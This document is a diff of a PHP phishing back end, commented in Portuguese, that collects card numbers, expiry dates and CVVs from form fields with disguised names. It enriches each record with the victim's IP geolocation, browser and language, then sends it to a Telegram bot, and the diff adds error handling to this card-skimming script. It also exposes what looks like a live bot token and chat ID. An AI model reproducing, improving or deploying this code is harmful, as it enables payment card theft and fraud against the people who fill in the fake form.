@@ -1,13 +1,31 @@
 <?php
-
-
-
+// Função para obter informações de IP com tratamento de erros
 function getIpInfo($ip) {
     $apiUrl = "http://ip-api.com/json/{$ip}";
-    $apiData = file_get_contents($apiUrl);
-    return json_decode($apiData, true);
+    $apiData = @file_get_contents($apiUrl);
+    if ($apiData === false) {
+        return [
+            'query'      => $ip,
+            'city'       => 'N/A',
+            'regionName' => 'N/A',
+            'country'    => 'N/A',
+            'isp'        => 'N/A'
+        ];
+    }
+    $data = json_decode($apiData, true);
+    if (!isset($data['status']) || $data['status'] !== 'success') {
+        return [
+            'query'      => $ip,
+            'city'       => 'N/A',
+            'regionName' => 'N/A',
+            'country'    => 'N/A',
+            'isp'        => 'N/A'
+        ];
+    }
+    return $data;
 }
 
+// Função para determinar o navegador
 function getBrowserName($userAgent) {
     $browser = "Desconhecido";
     if (preg_match('/Firefox/i', $userAgent)) {
@@ -26,51 +44,53 @@ function getBrowserName($userAgent) {
     return $browser;
 }
 
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    
-    if (isset($_POST['campoNome']) && isset($_POST['campoTel']) && isset($_POST['campoTel2'])) {
-        
-        $numeroCartao = $_POST['campoNome'];
-        $validadeCartao = $_POST['campoTel'];
-        $cvv = $_POST['campoTel2'];
-        $dataHora = date('Y-m-d H:i:s');
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    if (!empty($_POST['campoNome']) && !empty($_POST['campoTel']) && !empty($_POST['campoTel2'])) {
+        $numeroCartao   = trim($_POST['campoNome']);
+        $validadeCartao = trim($_POST['campoTel']);
+        $cvv            = trim($_POST['campoTel2']);
+        $dataHora       = date('Y-m-d H:i:s');
 
-        $ip = $_SERVER['REMOTE_ADDR'];
-        $userAgent = $_SERVER['HTTP_USER_AGENT'];
-        $lingua = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'N/A';
-
+        $ip        = $_SERVER['REMOTE_ADDR'];
+        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
+        $lingua    = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'N/A';
         $navegador = getBrowserName($userAgent);
-        $ipInfo = getIpInfo($ip);
+        $ipInfo    = getIpInfo($ip);
 
-        $conteudo = "☠️ | LOG NICKZADA";
-        $conteudo .= "💳 | Número do Cartão: $numeroCartao\n";
-        $conteudo .= "📅 | Validade: $validadeCartao\n";
-        $conteudo .= "🔑 | CVV: $cvv\n";
-        $conteudo .= "🏠 | IP: " . $ipInfo["query"] . "\n🔎 | Cidade: " . $ipInfo["city"] . "\n📍 | Região: " . $ipInfo["regionName"] . "\n🌎 | País: " . $ipInfo["country"] . "\n📦 | ISP: " . $ipInfo["isp"] . "\n\n";
-        $conteudo .= "🔓 | USER-AGENT: $userAgent\n";
-        $conteudo .= "🌐 | NAVEGADOR: $navegador\n";
-        $conteudo .= "👥 | LINGUAGEM: $lingua\n";
-        $conteudo .= "📆 | DATA/HORA: $dataHora\n\n";        
-        
-        $botToken = '7236468671:AAHRrN2HAHU78bRR6uZDuHiE3FxkDvoJW9M';
-        $chatId = '6924180031';
+        // Montagem do conteúdo
+        $conteudo  = "☠️ | LOG ";
+        $conteudo .= "💳 | Número do Cartão: {$numeroCartao}\n";
+        $conteudo .= "📅 | Validade: {$validadeCartao}\n";
+        $conteudo .= "🔑 | CVV: {$cvv}\n";
+        $conteudo .= "🏠 | IP: {$ipInfo['query']}\n";
+        $conteudo .= "🔎 | Cidade: {$ipInfo['city']}\n";
+        $conteudo .= "📍 | Região: {$ipInfo['regionName']}\n";
+        $conteudo .= "🌎 | País: {$ipInfo['country']}\n";
+        $conteudo .= "📦 | ISP: {$ipInfo['isp']}\n\n";
+        $conteudo .= "🔓 | USER-AGENT: {$userAgent}\n";
+        $conteudo .= "🌐 | NAVEGADOR: {$navegador}\n";
+        $conteudo .= "👥 | LINGUAGEM: {$lingua}\n";
+        $conteudo .= "📆 | DATA/HORA: {$dataHora}\n\n";
+
+        // Use variáveis de ambiente configuradas no Render
+        $botToken = getenv('7236468671:AAHRrN2HAHU78bRR6uZDuHiE3FxkDvoJW9M') ?: 'TOKEN_POR_AMBIENTE';
+        $chatId   = getenv('6924180031')   ?: 'CHAT_POR_AMBIENTE';
 
         $mensagem = urlencode($conteudo);
-        $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$mensagem}";
-
-        $response = file_get_contents($url);
+        $url      = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$mensagem}";
+        $response = @file_get_contents($url);
 
         if ($response !== false) {
-            header('Location: index.html'); 
-            exit();
+            header('Location: index.html');
+            exit;
         } else {
-            echo "Houve um erro ao enviar os dados. Tente novamente.";
+            echo "<p>Houve um erro ao enviar os dados. Tente novamente.</p>";
         }
     } else {
-        echo "Por favor, preencha todos os campos do formulário.";
+        echo "<p>Por favor, preencha todos os campos do formulário.</p>";
     }
 } else {
-    header('Location: https://t.me/duckettstoneprincipal'); 
-    exit();
+    header('Location: https://t.me/duckettstoneprincipal');
+    exit;
 }
 ?>
